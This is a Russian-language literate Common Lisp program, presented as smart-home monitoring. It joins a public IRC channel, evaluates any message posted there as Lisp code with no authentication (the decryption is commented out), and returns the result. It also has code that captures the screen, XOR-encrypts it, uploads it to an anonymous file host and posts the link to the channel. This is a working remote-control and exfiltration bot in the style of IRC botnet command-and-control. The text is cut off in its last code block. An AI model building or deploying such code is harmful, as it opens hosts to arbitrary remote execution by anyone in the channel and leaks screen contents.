#+STARTUP: showall indent hidestars

#+BEGIN_SRC lisp
  (sb-posix:get-pid)
  ,*/1 * * * * export DISPLAY=:0 && cd ~/quicklisp/ && flock -xn ./srv.lock sbcl --load ./srv.lisp > ./log.txt
#+END_SRC

* Intro

Это внешняя система мониторинга, предназначеная для наблюдения за работой
узла сети. Узел сети может быть не только desktop-системой, но и сервером
умного дома и осуществлять управление его компонентами: включать и
выключать нагрузку, отправлять команды роботу-пылесосу ("ехать на
зарядку"), и.т.п.

К сожалению, некоторые проприетарные компоненты автоматизации, такие как
3D-принтер, могут управляться только через GUI своей управляющей
программы. Поэтому для того чтобы удаленно управлять ими необходимо
анализировать скриншоты экрана и осуществлять операции виртуальной мышью
и клавиатурой над управляющей программой.

Поэтому мы должны отслеживать изменения на экране, отпралять их в
коммуникационный канал (естественно не в открытом виде) и иметь
возможность проанализировать их удаленно, а потом отослать команду,
которая будет выполнена.

Наша основная задача - сократить количество передаваемых данных, потому
что узлов сети может быть множество и не все из них имеют быстрые каналы
передачи.

* Supervisor

Мы хотим создать надежную систему, но подключение к интернету может быть
ненадежным, к тому же нет уверенности в том, что все ошибки, которые
могут возникнуть, будут корректно перехвачены.

Поэтому мы сделаем супервизор, который будет перезапускать потоки, в
которых будет происходить основная работа. Если у потока возникнут
проблемы - супервизор отследит это и перезапустит поток.

Чтобы иметь возможность изменять супервизор на лету, мы оформим его как
лямбду в глобальной переменной, которую будет вызывать функция
~supervisor-loop~.

Мы также используем флаги, размещенные в глобальных переменных, чтобы
супервизор мог принудительно завершать потоки. Если что-то пойдет не так
то поток может, например, перезапустить себя, выставив нужный флаг.

Каждую секунду супервизор инкрементирует состояние переменной
~watchdog-timer~. Если поток завис и не сбрасывает эту переменную в
ноль - супервизор принудительно завершает поток, что приводит к его
перезапуску.

Если соединение с irc-сервером установлено (о чем свидетельствует
~connection-established-flag~) то супервизор должен запускать новый поток
репортинга каждую секунду. Задача этого потока - сделать скриншот экрана,
поместить в png-файл, зашифровать его, загрузить на файлообменник и
послать полученную ссылку в чат. После выполнения задачи поток должен
завершиться. Это не обязательно произойдет - он может зависнуть из-за
ошибки или просто слишком долго работать. Поэтому супервизор отслеживает
количество таких потоков и если их становится больше чем
~max-shot-thread-cnt~ удаляет те, которые работают слишком долго.

#+NAME: supervisor
#+BEGIN_SRC lisp :noweb yes
  (defparameter *outlock* (bt:make-lock "output-lock"))

  (defmacro bprint (var)
    `(subseq (with-output-to-string (*standard-output*)
               (pprint ,var)) 1))

  (defmacro dbg (msg &rest params)
    "debug output with lock"
    `(bt:with-lock-held (*outlock*)
       (format t ,msg ,@params)
       (finish-output)))

  (defparameter *watchdog-timer* 0)

  (defparameter *watchdog-timer-max* 20)

  (defparameter *supervisor-stop-flag* nil)

  (defparameter *irc-th-stop-flag* nil)

  (defparameter *shot-th-stop-flag* nil)

  (defparameter *connection-established-flag* nil)

  (defparameter *shot-threads* nil)

  (defparameter *max-shot-thread-life-time* 5)

  (defparameter *max-shot-thread-cnt* 5)

  (defparameter *thread-operations-lock*
    (bt:make-lock "thread-operations-lock"))


  ;; irc
  <<irc>>

  ;; shot
  <<shot>>

  (defparameter *supervisor*
    (lambda ()
      (let ((all-threads (mapcar #'(lambda (th)  (cons (bt:thread-name th) th))
                                 (bt:all-threads))))
        (labels ((fnd (name) (loop :for (nm . th) :in all-threads
                                :do (when (equal name nm)  (return th))))
                 (kill (th)  (progn
                               (handler-case (bt:destroy-thread th)
                                 ;; happens, when thread destroyed already
                                 (TYPE-ERROR () nil))
                               (setf *watchdog-timer* 0)))
                 (kill-irc (th)
                   (kill th)
                   (setf *connection-established-flag* nil)))
          ;; if there is no irs-thread then start it
          (when (and (null (fnd "irc-th"))       ;; no irc-th
                     (null *irc-th-stop-flag*))  ;; no irc-th stop flag
            (dbg "::supervisor lambda: start irc-th~%")
            (setf *watchdog-timer* 0)
            (bt:make-thread
             #'irc :name "irc-th"
             :initial-bindings
             `((*standard-output* . ,*standard-output*)
               (*irc-thread-stop-flag* . ,*irc-th-stop-flag*))))
          ;; if there is irc-thread, but the watchdog-timer exceeds
          ;; or the flag is set - then kill it.
          (awhen (fnd "irc-th")
            (when (> *watchdog-timer*  *watchdog-timer-max*)
              (dbg "::supervisor-lambda: kill irc-th by WDG~%")
              (kill-irc it))
            (when *irc-th-stop-flag*
              (dbg "::supervisor-lambda: kill irc-th by FLAG~%")
              (kill-irc it)))
          ;; kill latecomers shot-threads if there are too many
          ;; TODO: debug it!
          (when (> (length *shot-threads*) *max-shot-thread-cnt*)
            (dbg "many threads~%")
            (loop :for (shot-th . time) :in *shot-threads* :do
                 (dbg "~A . ~A~%" shot-th time)
                 (when (> (- (get-universal-time) time)
                          ,*max-shot-thread-life-time*)
                   (dbg "::supervisor-lambda: kill shot-th by lifetime exceed~%")
                   (kill shot-th)))
            (bt:with-lock-held (*thread-operations-lock*)
              (setf *shot-threads*
                    (remove-if-not #'(lambda (pair)
                                       (bt:thread-alive-p (car pair)))
                                   ,*shot-threads*))))
          ;; start new shot-thread (every second when connection-established)
          (when *connection-established-flag*
            (let ((bindings `((*standard-output* . ,*standard-output*)
                              (*shot-thread-stop-flag* . ,*shot-th-stop-flag*)
                              (*irc-sess* . ,*irc-sess*)
                              (*irc-user* . ,*irc-user*)
                              (*irc-serv* . ,*irc-serv*)
                              (*irc-chan* . ,*irc-chan*)
                              (*irc-lock* . ,*irc-lock*)
                              (*irc-conn* . ,*irc-conn*))))
              (bt:with-lock-held (*thread-operations-lock*)
                (push (cons (bt:make-thread #'shot :name "shot-th"
                                            :initial-bindings bindings)
                            (get-universal-time))
                      ,*shot-threads*))))))))

  (defun supervisor-loop ()
    (setf *watchdog-timer* 0)
    (tagbody
     infinite
       (when *supervisor-stop-flag*
         (go end))
       (dbg "::supervisor-loop WDG=~3,'0D~%" *watchdog-timer*)
       (funcall *supervisor*)
       (sleep 1)
       (incf *watchdog-timer*)
       (go infinite)
     end))

  (supervisor-loop)
#+END_SRC

* Irc

Работа с IRC состоит из нескольких этапов
- Подключение
- Запуск цикла чтения сообщений
- Установка хука, чтобы перехватить сообщения-команды
- Подключение к каналу и отправка первого сообщения

** Connect

Начнем с подключения к IRC - нашему коммуникационному каналу.

Если нет подключения к сети мы получим ошибку
~USOCKET:NS-TRY-AGAIN-CONDITION~, которая будет проигнорирована, но
записана в лог, как и любые другие ошибки подключения. В этих случаях
функция ~irc-loop~ не будет вызвана, произойдет выход их функции потока и
поток будет завершен. Обнаружив отсутствие потока супервизор перезапустит
его и это приведет к следующей попытке подключения.

Если подключение произошло успешно - мы вызываем ~irc-loop~.

#+NAME: irc
#+BEGIN_SRC lisp :noweb yes
  (defparameter *irc-sess* nil) ;; (get-universal-time)
  (defparameter *irc-user* nil) ;; (format nil "b~A" *irc-sess*)
  (defparameter *irc-serv* "irc.freenode.org")
  (defparameter *irc-chan* "#nvrtlessfndout")
  (defparameter *irc-lock* (bt:make-lock "irc-lock"))
  (defparameter *irc-conn* nil)

  <<irc_loop>>

  (defun irc ()
    "irc thread func"
    (setf *irc-sess* (get-universal-time))
    (setf *irc-user* (format nil "b~A" *irc-sess*))
    (setf *irc-conn*
          (handler-case
              (cl-irc:connect :nickname *irc-user* :server *irc-serv*)
            (USOCKET:NS-TRY-AGAIN-CONDITION (err)
              (dbg "::irc connect error: ~A~%" (type-of err))
              nil)
            (t (err)
              (dbg "::irc connect error: ~A~%" (type-of err))
              nil)))
    (when *irc-conn*
      (dbg "::irc conn:~A~%" *irc-conn*)
      (setf *watchdog-timer* 0)
      (irc-loop)))
#+END_SRC

** Read loop

После успешного подключения мы запускаем цикл чтения сообщений из
коммуникационного канала. В случае успеха этот поток будет зациклен в
нем, поэтому здесь мы должны запустить вспомогательный поток
~irc-helper~, который установит нужные хуки

При временном отключении интернета внутри ~CL-IRC:READ-MESSAGE-LOOP~
может возникнуть ошибка ~SB-INT:SIMPLE-STREAM-ERROR~ с сообщением вида
couldn't read from #<SB-SYS:FD-STREAM for "socket 192.168.0.102:50644,
peer: 149.56.134.238:6667" {1008002283}>: Connection reset by peer

В этом случае нужно сделать реконнект. Чтобы его осуществить мы просто
игнорируем ошибку, выведя её в лог и возвращая NIL. Это приводит к выходу
из функции потока и супервизор запустит поток снова на следующем шаге.

#+NAME: irc_loop
#+BEGIN_SRC lisp :noweb yes
  <<irc_helper>>

  (defun irc-loop ()
    (bt:make-thread
     #'irc-helper :name "irc-helper-th"
     :initial-bindings
     `((*standard-output* . ,*standard-output*)
       (*irc-sess* . ,*irc-sess*)
       (*irc-user* . ,*irc-user*)
       (*irc-serv* . ,*irc-serv*)
       (*irc-chan* . ,*irc-chan*)
       (*irc-lock* . ,*irc-lock*)
       (*irc-conn* . ,*irc-conn*)))
    (handler-case (cl-irc:read-message-loop *irc-conn*)
      (SB-INT:SIMPLE-STREAM-ERROR (err)
        (dbg "::irc-loop error: ~A~%" (type-of err)))
      ;; (t (err)
      ;;   (dbg "::irc-loop error: ~A~%" (type-of err)))
      ))
#+END_SRC

** Irc helper

После того как мы запустили цикл чтения сообщений следует подождать
немного, чтобы успели дойти приветственные сообщения канала.

Мы устанавливаем хук чтобы перехватить приход сообщений и подключаемся к
каналу.

После этого мы считаем, что соединение корректно установлено, о чем
сигнализируем установкой флага *connection-established-flag*

После этого можно отправить сообщение о присутствии.

Затем поток завершается - свою задачу он выполнил.

#+NAME: irc_helper
#+BEGIN_SRC lisp :noweb yes
  (defmacro sendmsg (msg &rest params)
    `(bt:with-lock-held (*irc-lock*)
       (cl-irc:privmsg *irc-conn* *irc-chan* (format nil ,msg ,@params))))

  ;; irc-hook
  <<irc_hook>>

  (defun irc-helper ()
    (sleep 1)
    (cl-irc:add-hook *irc-conn* 'cl-irc:IRC-PRIVMSG-MESSAGE #'irc-msg-hook)
    (sleep 1)
    (bt:with-lock-held (*irc-lock*)
      (cl-irc:join *irc-conn* *irc-chan*))
    (sleep 1)
    (bt:with-lock-held (*irc-lock*)
      (setf *connection-established-flag* t))
    (sendmsg "hi"))
#+END_SRC

** Command hook

Определим функцию, которая будет обрабатывать сообщения, получаемые из
irc-канала. Она должна возвращать T чтобы предотвратить дальнейшую
обработку принятого сообщения.

#+NAME: irc_hook
#+BEGIN_SRC lisp :noweb yes
  ;; irc_cmd_proc
  <<irc_cmd_proc>>

  (defun irc-msg-hook (param)
    "MUST return T for stop hooks processing"
    (funcall *irc-cmd* param)
    (setf *watchdog-timer* 0)
    t)
#+END_SRC

У сообщения есть следующие поля:
- CL-IRC:SOURCE
- CL-IRC:USER
- CL-IRC:HOST
- CL-IRC:COMMAND
- CL-IRC:ARGUMENTS
- CL-IRC:CONNECTION
- CL-IRC:RECEIVED-TIME
- CL-IRC:RAW-MESSAGE-STRING

Из них нас интересует собственно команда размещенная в ~ARGUMENTS~.

#+NAME: irc_cmd_proc
#+BEGIN_SRC lisp :noweb yes
  ;; seq_xor
  <<seq_xor>>
  ;; ecrypt
  <<encrypt>>
  ;; decrypt
  <<decrypt>>

  (defparameter *irc-cmd*
    (lambda (param)
      (block irc-cmd-block
        (let* ((msg  (cadr (CL-IRC:ARGUMENTS param)))
               ;; (oct  (decrypt msg *irc-sess*))
               ;; (str  (handler-case
               ;;           (flex:octets-to-string oct :external-format :utf-8)
               ;;         (FLEXI-STREAMS:EXTERNAL-FORMAT-ENCODING-ERROR () nil)))
               (str msg)
               )
          (dbg "::COMMAND: [~A]~%" msg)
          (dbg "::EVAL [~A]~%" str)
          (finish-output)
          (setf *watchdog-timer* 0)
          (let ((result (handler-case (bprint (eval (read-from-string  str)))
                          (t (err)
                            (dbg "::irc-cmd error: ~A~%" (type-of err))
                            (sendmsg "ERR: [~A]" (type-of err))
                            (return-from irc-cmd-block nil)))))
            (setf *watchdog-timer* 0)
            (sendmsg "=> ~A" result)
            (dbg "::=> ~A~%" result)
            (finish-output))))))

  ;; (encrypt
  ;;  (flex:string-to-octets
  ;;   "(defun snd () (bt:with-lock-held (*irc-lock*) (cl-irc:privmsg *irc-conn* *irc-chan* (format nil \"nfo:error\"))))"
  ;;   :external-format :utf-8)
  ;;  3783992823)

  ;; (encrypt
  ;;  (flex:string-to-octets
  ;;   ;; "(unschedule-timer *shot-timer*)"
  ;;   "(schedule-timer *shot-timer* 1 :repeat-interval 1)"
  ;;   :external-format :utf-8)
  ;;  3783995947)

  ;; (encrypt
  ;;  (flex:string-to-octets
  ;;   "(progn (quit))"
  ;;   :external-format :utf-8)
  ;;  3783992823)

  ;; (flex:octets-to-string
  ;;  (decrypt
  ;;   "62Y5gGs3D5BAEdec7Ls=" 3783992823)
  ;;  :external-format :utf-8)
#+END_SRC

** Sequence XOR

#+NAME: seq_xor
#+BEGIN_SRC lisp
  (defun seq-xor (len seq-1 seq-2)
    (let ((result (make-array len :element-type '(unsigned-byte 8))))
      (do ((idx 0 (incf idx)))
          ((= idx len))
        (setf (aref result idx)
              (logxor (aref seq-1 idx)
                      (aref seq-2 idx))))
      result))
#+END_SRC

** Encrypt

#+NAME: encrypt
#+BEGIN_SRC lisp
  (defun encrypt (oct seed)
    (let* ((len (length oct))
           (gen (prbs:byte-gen 31 :seed seed))
           (gam (funcall gen len))
           (enc (seq-xor len oct gam)))
      (base64:usb8-array-to-base64-string enc)))
#+END_SRC

** Decrypt

#+NAME: decrypt
#+BEGIN_SRC lisp
  (defun decrypt (base64 seed)
    (let* ((oct (base64:base64-string-to-usb8-array base64))
           (gen (prbs:byte-gen 31 :seed seed))
           (len (length oct))
           (gam (funcall gen len)))
      (seq-xor len oct gam)))
#+END_SRC

* Snapshot function

Сама функция скриншота должна сделать скриншот и обработать его, а потом
реинициализировать свой таймер

#+NAME: shot
#+BEGIN_SRC lisp :noweb yes
  <<x_display>>
  <<pack_image>>
  <<unpack_image>>
  <<upload>>

  (defun shot ()
    ;; (dbg "~A~%" *shot-threads*)
    (sendmsg "shot started")
    (sleep 100))

  ;; (defparameter *shot-timer*
  ;;   (make-timer #'(lambda ()
  ;;                   (shot))
  ;;               :name "shot" :thread t))

  ;; (defparameter *stop* nil)

  ;; (let ((prev)
  ;;       (cnt 9999))
  ;;   (defun shot ()
  ;;     (let* ((snap (pack-image (x-snapshot)))
  ;;            (dims (array-dimensions snap)))
  ;;       (if (> cnt 4)
  ;;           (progn
  ;;             (save "~A" dims snap)
  ;;             (setf prev snap)
  ;;             (setf cnt 0))
  ;;           ;; else
  ;;           (let ((xored (make-array dims :element-type '(unsigned-byte 8))))
  ;;             (do ((qy 0 (incf qy)))
  ;;                 ((= qy (car dims)))
  ;;               (declare (type fixnum qy))
  ;;               (do ((qx 0 (incf qx)))
  ;;                   ((= qx (cadr dims)))
  ;;                 (declare (type fixnum qx))
  ;;                 (setf (aref xored qy qx)
  ;;                       (logxor (aref prev qy qx)
  ;;                               (aref snap qy qx)))))
  ;;             (save (format nil "~~A_~A" cnt) dims xored)
  ;;             (setf prev snap)
  ;;             (incf cnt))))))

  ;; (schedule-timer *shot-timer* 1 :repeat-interval 1)



  (defun save-png (width height pathname-str image
                   &optional (color-type :truecolor-alpha))
    (let* ((png (make-instance 'zpng:png :width width :height height
                               :color-type color-type))
           (vector (make-array ;; displaced vector - need copy for save
                    (* height width (zpng:samples-per-pixel png))
                    :displaced-to image :element-type '(unsigned-byte 8))))
      ;; Тут применен потенциально опасный трюк, когда мы создаем
      ;; объект PNG без данных, а потом добавляем в него данные,
      ;; используя неэкспортируемый writer.
      ;; Это нужно чтобы получить третью размерность массива,
      ;; который мы хотим передать как данные и при этом
      ;; избежать создания для этого временного объекта
      (setf (zpng::%image-data png) (copy-seq vector))
      (zpng:write-png png pathname-str)))

  (defun save (frmt-filename-str dims image)
    (block save-block
      (let* ((height     (car  dims))
             (width      (cadr dims))
             (png        (get-png-obj width height image :grayscale))
             (png-seq    (get-png-sequence png))
             (base64     (encrypt png-seq *irc-sess*))
             (decoded    (decrypt base64 *irc-sess*))
             (filename   (format nil frmt-filename-str
                                 (format nil "~A" (get-universal-time))))
             (upload-ret (handler-case
                             (cl-json:decode-json-from-string
                              (anon-file-upload filename base64))
                           (JSON:JSON-SYNTAX-ERROR ()
                             (return-from save-block nil))))
             (link       (if (cdr (assoc :status upload-ret))
                             (subseq (cdadr (cadadr (assoc :data upload-ret))) 20)
                             nil))
             ;; (full-filename (format nil "FILE_~A_~A"
             ;;                        *irc-sess*
             ;;                        filename))
             )
        (cl-irc:privmsg *irc-conn* *irc-chan*
                        (if link
                            link
                            upload-ret))
        ;; (with-open-file (file-stream full-filename
        ;;                              :direction :output
        ;;                              :if-exists :supersede
        ;;                              :if-does-not-exist :create
        ;;                              :element-type '(unsigned-byte 8))
        ;;   (write-sequence decoded file-stream))
        )))
#+END_SRC

** unpack_procedure

#+NAME: unpack_procedure
#+BEGIN_SRC lisp
  (let* ((fname-in #P"~/Downloads/3784024465")
         (enc  (alexandria:read-file-into-string fname-in :external-format :utf-8))
         (dec  (decrypt enc *irc-sess*))
         ;; (dec (alexandria:read-file-into-byte-vector #P"~/Documents/ab-pack.png"))
         (png (let ((png-read::*png-file* "fake-file"))
                 (flex:with-input-from-sequence (stream dec)
                   (png-read:read-png-datastream stream))))
         (image-data (png-read:image-data png))
         ;; reverse
         (dims   (subseq (array-dimensions image-data) 0 2))
         (height (cadr dims))
         (width  (car  dims))
         (image ;; меняем размерности X и Y местами
          (let ((result (make-array (list height width)
                                    :element-type '(unsigned-byte 8))))
            (do ((y 0 (incf y)))
                ((= y height))
              (do ((x 0 (incf x)))
                  ((= x width))
                (setf (aref result y x)
                      (aref image-data x y))))
            result))
         ;; unpacking
         (unpack (unpack-image image))
         (unpack-dims (array-dimensions unpack))
         (new-width (cadr unpack-dims))
         (pathname-str "~/Documents/unpack-big.png")
         )
    (let* ((png (make-instance 'zpng:png
                               :width new-width
                               :height height
                               :color-type :grayscale))
           (vector (make-array ;; displaced vector - need copy for save
                    (* height new-width (zpng:samples-per-pixel png))
                    :displaced-to unpack :element-type '(unsigned-byte 8))))
      ;; Тут применен потенциально опасный трюк, когда мы создаем
      ;; объект PNG без данных, а потом добавляем в него данные,
      ;; используя неэкспортируемый writer.
      ;; Это нужно чтобы получить третью размерность массива,
      ;; который мы хотим передать как данные и при этом
      ;; избежать создания для этого временного объекта
      (setf (zpng::%image-data png) (copy-seq vector))
      (zpng:write-png png pathname-str)))
#+END_SRC

** X-Display

Этот раздел описывает библиотечные функции, которые необходимы для
получения снимков экрана

Работа с экраном через ~xlib~:
- Получение размеров экрана
- Получение снимков экрана

После получения размеров экрана мы сохраняем их в глобальные переменные
вида ~default-*~, чтобы после работать с ними напрямую - за это отвечает
вызов функции ~init-defaults~.

При формировании скришота мы перекодируем его функцией
~raw-image->png~. При оптимизации эту перекодировку следует удалить,
чтобы ускорить работу, но пока нам требуется отлаживаемость а не
скорость.

#+NAME: x_display
#+BEGIN_SRC lisp :padline no
  (defmacro with-display (host (display screen root-window) &body body)
    `(let* ((,display (xlib:open-display ,host))
            (,screen (first (xlib:display-roots ,display)))
            (,root-window (xlib:screen-root ,screen)))
       (unwind-protect (progn ,@body)
         (xlib:close-display ,display))))

  (defmacro with-default-display ((display &key (force nil)) &body body)
    `(let ((,display (xlib:open-default-display)))
       (unwind-protect
            (unwind-protect
                 ,@body
              (when ,force
                (xlib:display-force-output ,display)))
         (xlib:close-display ,display))))

  (defmacro with-default-display-force ((display) &body body)
    `(with-default-display (,display :force t) ,@body))

  (defmacro with-default-screen ((screen) &body body)
    (let ((display (gensym)))
      `(with-default-display (,display)
         (let ((,screen (xlib:display-default-screen ,display)))
           ,@body))))

  (defmacro with-default-window ((window) &body body)
    (let ((screen (gensym)))
      `(with-default-screen (,screen)
         (let ((,window (xlib:screen-root ,screen)))
           ,@body))))

  (defun x-size ()
    (with-default-screen (s)
      (values
       (xlib:screen-width s)
       (xlib:screen-height s))))

  (defparameter *default-x* 0)
  (defparameter *default-y* 0)
  (defparameter *default-width* 800)
  (defparameter *default-height* 600)

  (defun init-defaults ()
    (multiple-value-bind (width height)
        (x-size)
      (setf *default-width* width
            ,*default-height* height
            ,*default-x* 0
            ,*default-y* 0)))

  (init-defaults)

  (defun raw-image->png (data width height)
    (let* ((png (make-instance 'zpng:png :width width :height height
                               :color-type :truecolor-alpha
                               :image-data data))
           (data (zpng:data-array png)))
      (dotimes (y height)
        (dotimes (x width)
          ;; BGR -> RGB, ref code: https://goo.gl/slubfW
          ;; diffs between RGB and BGR: https://goo.gl/si1Ft5
          (rotatef (aref data y x 0) (aref data y x 2))
          (setf (aref data y x 3) 255)))
      png))

  (defun x-snapshot (&key (x *default-x*) (y *default-y*)
                       (width  *default-width*) (height *default-height*)
                       path)
    ;; "Return RGB data array (The dimensions correspond to the height, width,
    ;; and pixel components, see comments in x-snapsearch for more details),
    ;; or write to file (PNG only), depend on if you provide the path keyword"
    (with-default-window (w)
      (let ((image
             (raw-image->png
              (xlib:get-raw-image w :x x :y y
                                  :width width :height height
                                  :format :z-pixmap)
              width height)
            ))
        (if path
            (let* ((ext (pathname-type path))
                   (path
                    (if ext
                        path
                        (concatenate 'string path ".png")))
                   (png? (or (null ext) (equal ext "png"))))
              (cond
                (png? (zpng:write-png image path))
                (t (error "Only PNG file is supported"))))
            (zpng:data-array image)))))

  ;; (x-snapshot :path "x-snapshot-true-color.png")
#+END_SRC

** Packing image

Нам нужна функция, для быстрой упаковки изображения. Она не тривиальна.

Мы берем полноцветное изображение и используем два вложенных цикла,
проходя по ~Y~ и ~X~ чтобы обработать каждую точку. После обработки одна
точка должна занимать только один бит.

Мы также должны упаковать по восемь точек в байт, но если размер
изображения в точках не кратен байту, то нужно дополнить недостающие
точки. За это отвечате внутренний макрос ~byte-finiser~, который
вызывается по мере накопления значений в байте и в конце обработки
строки, если это необходимо.

#+NAME: pack_image
#+BEGIN_SRC lisp
  (defun pack-image (image)
    (declare (optimize (speed 3) (safety 0)))
    (let* ((dims (array-dimensions image))
           (height (car dims))
           (width (cadr dims))
           (new-width (ash (logand (+ width 7) (lognot 7)) -3))
           (need-finisher (not (equal new-width (ash width -3))))
           (result (make-array (list height new-width)
                               :element-type '(unsigned-byte 8)))
           (bp 8)
           (acc 0))
      (declare (type (unsigned-byte 8) acc)
               (type fixnum bp)
               (type fixnum width)
               (type fixnum new-width)
               (type fixnum height))
      (macrolet ((byte-finisher (acc qy qx bp)
                   `(progn
                      ;; (format t "~8,'0B(~2,'0X)" ,acc ,acc)
                      (setf (aref result ,qy (ash ,qx -3)) ,acc)
                      (setf ,acc 0)
                      (setf ,bp 8))))
        (do ((qy 0 (incf qy)))
            ((= qy height))
          (declare (type fixnum qy))
          (do ((qx 0 (incf qx)))
              ((= qx width) (when need-finisher
                              (byte-finisher acc qy qx bp)))
            (declare (type fixnum qx))
            (let* ((avg (floor (+ (aref image qy qx 0)
                                  (aref image qy qx 1)
                                  (aref image qy qx 2))
                               3))
                   (pnt (ash avg -7)))
              (declare (type fixnum avg))
              (declare (type fixnum pnt))
              (decf bp)
              (setf acc (logior acc (ash pnt bp)))
              (when (= bp 0)
                (byte-finisher acc qy qx bp))))
          ;; (format t "~%")
          ))
      result))

  ;; (disassemble 'pack-image)

  ;; TEST: pack-image
  ;; (time
  ;;  (let* ((image (pack-image (x-snapshot)))
  ;;         (dims (array-dimensions image)))
  ;;    (save-png (cadr dims)
  ;;              (car dims)
  ;;              (format nil "~A" (gensym "FILE"))
  ;;              image
  ;;              :grayscale)))
#+END_SRC

** Save and Load

Для целей отладки нам нужно уметь сохранять и загружать png-изображения

#+NAME: save_and_load_png
#+BEGIN_SRC lisp
  (defun get-png-obj (width height image &optional (color-type :truecolor-alpha))
    (let* ((png (make-instance 'zpng:png :width width :height height
                               :color-type color-type))
           (vector (make-array ;; displaced vector - need copy for save
                    (* height width (zpng:samples-per-pixel png))
                    :displaced-to image :element-type '(unsigned-byte 8))))
      ;; Тут применен потенциально опасный трюк, когда мы создаем
      ;; объект PNG без данных, а потом добавляем в него данные,
      ;; используя неэкспортируемый writer.
      ;; Это нужно чтобы получить третью размерность массива,
      ;; который мы хотим передать как данные и при этом
      ;; избежать создания для этого временного объекта
      (setf (zpng::%image-data png) (copy-seq vector))
      png))

  (defun get-png-sequence (png)
    (flex:with-output-to-sequence (stream)
      (zpng:write-png-stream png stream)))

  ;; DEPRECATED, use explicit saving png-sequence by with-open-file
  ;; (defun save-png (pathname-str png)
  ;;   (zpng:write-png png pathname-str))

  (defun load-png (pathname-str)
    "Возвращает массив size-X столбцов по size-Y точек,
       где столбцы идут слева-направо, а точки в них - сверху-вниз
       ----
       В zpng есть указание на возможные варианты COLOR:
       ----
             (defmethod samples-per-pixel (png)
               (ecase (color-type png)
                 (:grayscale 1)
                 (:truecolor 3)
                 (:indexed-color 1) ;; НЕ ПОДДЕРЖИВАЕТСЯ
                 (:grayscale-alpha 2)
                 (:truecolor-alpha 4)))
      "
    (let* ((png (png-read:read-png-file pathname-str))
           (image-data (png-read:image-data png))
           (color (png-read:colour-type png))
           (dims (cond ((or (equal color :truecolor-alpha)
                            (equal color :truecolor))
                        (list (array-dimension image-data 1)
                              (array-dimension image-data 0)
                              (array-dimension image-data 2)))
                       ((or (equal color :grayscale)
                            (equal color :greyscale))
                        (list (array-dimension image-data 1)
                              (array-dimension image-data 0)))
                       (t (error 'unk-png-color-type :color color))))
           (result ;; меняем размерности X и Y местами
            (make-array dims :element-type '(unsigned-byte 8))))
      ;; (dbg "~% new-arr ~A "(array-dimensions result))
      ;; ширина, высота, цвет => высота, ширина, цвет
      (macrolet ((cycle (&body body)
                   `(do ((y 0 (incf y)))
                        ((= y (array-dimension result 0)))
                      (do ((x 0 (incf x)))
                          ((= x (array-dimension result 1)))
                        ,@body))))
        (cond ((or (equal color :truecolor-alpha)
                   (equal color :truecolor))
               (cycle (do ((z 0 (incf z)))
                          ((= z (array-dimension result 2)))
                        (setf (aref result y x z)
                              (aref image-data x y z)))))
              ((or (equal color :grayscale)
                   (equal color :greyscale))
               (cycle (setf (aref result y x)
                            (aref image-data x y))))
              (t (error 'unk-png-color-type :color color)))
        result)))
#+END_SRC

** Bit-vector operations

Для целей отладки определим операции кодирования в битовый вектор и
обратно

#+NAME: bit_vector
#+BEGIN_SRC lisp
  (defun bit-vector->integer (bit-vector)
    "Create a positive integer from a bit-vector."
    (reduce #'(lambda (first-bit second-bit)
                (+ (* first-bit 2) second-bit))
            bit-vector))

  (defun integer->bit-vector (integer)
    "Create a bit-vector from a positive integer."
    (labels ((integer->bit-list (int &optional accum)
               (cond ((> int 0)
                      (multiple-value-bind (i r) (truncate int 2)
                        (integer->bit-list i (push r accum))))
                     ((null accum) (push 0 accum))
                     (t accum))))
      (coerce (integer->bit-list integer) 'bit-vector)))
#+END_SRC

** Binarization

Получение черно-белого изображения или в градациях серого из
полноцветного.

Здесь остается пространство для оптимизаций путем применения
SIMD-операций.

#+NAME: binarization
#+BEGIN_SRC lisp
  (defun binarization (image &optional threshold)
    (let* ((dims (array-dimensions image))
           (new-dims (cond ((equal 3 (length dims))  (butlast dims))
                           ((equal 2 (length dims))  dims)
                           (t (error 'binarization-error))))
           (result (make-array new-dims :element-type '(unsigned-byte 8))))
      (macrolet ((cycle (&body body)
                   `(do ((y 0 (incf y)))
                        ((= y (array-dimension image 0)))
                      (do ((x 0 (incf x)))
                          ((= x (array-dimension image 1)))
                        ,@body))))
        (cond ((equal 3 (length dims))
               (cycle (do ((z 0 (incf z)))
                          ((= z (array-dimension image 2)))
                        (let ((avg (floor (+ (aref image y x 0)
                                             (aref image y x 1)
                                             (aref image y x 2))
                                          3)))
                          (when threshold
                            (if (< threshold avg)
                                (setf avg 255)
                                (setf avg 0)))
                          (setf (aref result y x) avg)))))
              ((equal 2 (length dims))
               (cycle (let ((avg (aref image y x)))
                        (when threshold
                          (if (< threshold avg)
                              (setf avg 255)
                              (setf avg 0)))
                        (setf (aref result y x) avg))))
              (t (error 'binarization-error))))
      result))

  ;; TEST: binarize and save screenshot
  ;; (let* ((to   "x-snapshot-binarize.png")
  ;;        (image-data (binarization (x-snapshot) 127))) ;; NEW: threshold!
  ;;   (destructuring-bind (height width) ;; NB: no depth!
  ;;       (array-dimensions image-data)
  ;;     (save-png width height to image-data :grayscale))) ;; NB: grayscale!


  ;; TEST: binarize get png and save
  ;; (print
  ;;  (let* ((image-data (binarization (x-snapshot) 127))) ;; NEW: threshold!
  ;;    (destructuring-bind (height width) ;; NB: no depth!
  ;;        (array-dimensions image-data)
  ;;      (let ((seq (get-png width height image-data :grayscale)))
  ;;        (with-open-file (file-stream "tee.png"
  ;;                                     :direction :output
  ;;                                     :if-exists :supersede
  ;;                                     :if-does-not-exist :create
  ;;                                     :element-type '(unsigned-byte 8))
  ;;          (write-sequence seq file-stream))))))
#+END_SRC

** Bit-image

Упаковка бинаризованного черно-белого изображения в битовый массив

#+NAME: make_bit_image
#+BEGIN_SRC lisp
  (defun make-bit-image (image-data)
    (destructuring-bind (height width &optional colors)
        (array-dimensions image-data)
      ;; функция может работать только с бинарными изобажениями
      (assert (null colors))
      (let* ((new-width (+ (logior width 7) 1))
             (bit-array (make-array (list height new-width)
                                    :element-type 'bit
                                    :initial-element 1)))
        (do ((qy 0 (incf qy)))
            ((= qy height))
          (do ((qx 0 (incf qx)))
              ((= qx width))
            ;; если цвет пикселя не белый, считаем,
            ;; что это не фон и заносим в битовый массив 1
            (if (equal (aref image-data qy qx) 255)
                (setf (bit bit-array qy qx) 1)
                (setf (bit bit-array qy qx) 0))))
        bit-array)))

  ;; TEST: make-bit-image
  ;; (print
  ;;  (make-bit-image
  ;;   (binarization (x-snapshot :x 0 :y 0 :width 30 :height 30) 127)))
#+END_SRC

** Unpack image

#+NAME: unpack_image
#+BEGIN_SRC lisp
